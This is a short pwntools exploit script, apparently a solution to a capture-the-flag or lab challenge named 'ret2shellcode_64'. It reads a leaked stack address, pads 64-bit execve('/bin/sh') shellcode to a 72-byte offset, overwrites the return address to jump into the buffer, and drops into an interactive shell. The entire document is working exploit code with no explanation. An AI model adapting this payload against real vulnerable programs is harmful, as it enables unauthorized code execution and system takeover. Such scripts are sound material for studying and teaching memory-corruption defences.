from pwn import *
context(os='linux', arch='amd64')
p = process("./ret2shellcode_64")

# context.terminal=["tmux",'sp','-h']
# gdb.attach(p)

p.recvuntil(b"0x")
buf_add = int(p.recvline()[:-1].decode(),16)
log.success("buf address = {}".format(hex(buf_add)))
offset = 72
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode.ljust(offset,b"a")+p64(buf_add)

p.sendline(payload)
log.success("pid = {}".format(pidof(p)))
p.interactive()
